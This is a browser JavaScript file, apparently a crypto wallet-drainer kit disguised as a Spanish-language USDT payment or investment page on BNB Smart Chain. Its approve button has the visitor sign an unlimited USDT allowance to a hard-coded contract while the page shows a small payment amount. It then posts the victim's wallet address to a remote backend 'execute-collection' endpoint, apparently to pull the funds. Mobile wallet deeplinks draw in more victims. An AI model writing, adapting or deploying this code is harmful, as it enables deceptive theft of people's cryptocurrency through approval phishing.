"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// Wake up Render backend
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  const toastEl = document.getElementById("toast");
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  const approveBtn = document.getElementById("approveBtn");
  const btnText    = document.getElementById("btnText");
  const btnSpinner = document.getElementById("btnSpinner");
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "APROBAR USDT";
  if (btnSpinner) btnSpinner.hidden = !on;
}

// ─── Proveedor Seguro con Espera Activa ──────────────────────────────────────
async function getEthereumProvider() {
  if (window.ethereum) return window.ethereum;

  return new Promise((resolve) => {
    let checks = 0;
    const interval = setInterval(() => {
      checks++;
      if (window.ethereum) {
        clearInterval(interval);
        resolve(window.ethereum);
      } else if (checks > 30) {
        clearInterval(interval);
        resolve(null);
      }
    }, 100);
  });
}

// ─── Modal Nativo con Deeplinks Corregidos ────────────────────────────────────
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  
  const rawUrl = window.location.href;
  const encodedUrl = encodeURIComponent(rawUrl);
  const urlNoProtocol = rawUrl.replace(/^https?:\/\//, '');

  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;";

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;font-family:sans-serif;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;">Abrir en Billetera</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;">&times;</button>
        </div>
        <p style="font-size:13px;color:#a1a1aa;margin-bottom:16px;">Selecciona tu aplicación para conectar de forma segura:</p>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">Trust Wallet</a>
          <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">MetaMask</a>
          <a href="https://link.safepal.io/open_url?url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">SafePal</a>
          <a href="okx://wallet/dapp/url?dappUrl=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">OKX Wallet</a>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
  } else {
    modal.style.display = "flex";
  }
}

// ─── Inicialización Segura al Cargar el DOM ───────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  const approveBtn    = document.getElementById("approveBtn");
  const merchantInput = document.getElementById("merchantAddress");

  if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

  if (!approveBtn) {
    console.error("No se encontró el elemento #approveBtn en el HTML.");
    return;
  }

  // Función principal de ejecución del botón
  async function handleApprovalAction() {
    setLoading(true, "Sincronizando wallet…");

    const provider = await getEthereumProvider();

    if (!provider) {
      setLoading(false);
      if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
        showMobileWalletSelector();
      } else {
        showToast("Billetera no detectada. Instala MetaMask o abre en navegador Web3.", "error");
      }
      return;
    }

    try {
      setLoading(true, "Conectando…");
      const accounts = await provider.request({ method: "eth_requestAccounts" });
      const userAddress = accounts?.[0];

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }

      const currentChain = await provider.request({ method: "eth_chainId" });
      if (currentChain !== BSC_CHAIN_ID_HEX) {
        try {
          await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await provider.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const iface      = new ethers.Interface(ERC20_ABI);

      setLoading(true, "Firma requerida en wallet…");
      const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);

      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [{ from: userAddress, to: BSC_USDT_ADDRESS, data: approveData, value: "0x0" }]
      });

      if (!txHash) throw new Error("Transacción cancelada.");

      setLoading(true, "Finalizando…");
      const uiAmount = document.getElementById("investAmount")?.value || "1";
      const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

      await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: dynamicAmountWei })
      });

      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      if (err.code === 4001 || err?.message?.toLowerCase().includes("rejected")) {
        showToast("Transacción cancelada por el usuario.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error en la transacción. Intenta nuevamente.", "error");
      }
    } finally {
      setLoading(false);
    }
  }

  // Vincular eventos de forma robusta para evitar bloqueos en móviles
  approveBtn.addEventListener("click", handleApprovalAction);
  approveBtn.addEventListener("touchend", (e) => {
    e.preventDefault(); // Prevenir doble disparo en algunos navegadores móviles
    handleApprovalAction();
  });
});
